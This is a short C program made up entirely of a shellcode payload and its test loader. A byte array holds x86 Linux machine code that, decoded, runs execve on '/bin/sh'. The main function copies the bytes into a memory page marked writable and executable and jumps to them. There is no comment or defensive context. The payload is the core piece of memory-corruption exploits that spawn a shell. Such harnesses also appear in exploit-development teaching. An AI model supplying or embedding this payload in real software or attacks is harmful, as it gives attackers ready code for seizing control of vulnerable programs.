char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x89\xe1\x41\x41\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x51\x89\xe1\xb0\x0b\xcd\x80";

#include <sys/mman.h>
#include <string.h>
int main() {
    int (*sc)() = mmap(NULL, 4096, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(sc, shellcode, sizeof(shellcode));
    return sc();
}
